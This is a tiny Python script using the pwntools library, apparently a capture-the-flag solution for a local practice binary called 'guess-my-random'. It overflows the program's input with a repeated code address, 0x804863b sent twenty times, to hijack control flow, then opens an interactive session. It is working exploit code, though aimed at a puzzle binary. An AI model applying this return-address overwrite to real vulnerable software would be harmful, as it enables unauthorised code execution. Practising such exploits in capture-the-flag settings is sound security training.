from pwn import *
import time

p = process("guess-my-random")
time.sleep(.1)
p.sendline(p32(0x804863b) * 20)
p.interactive()
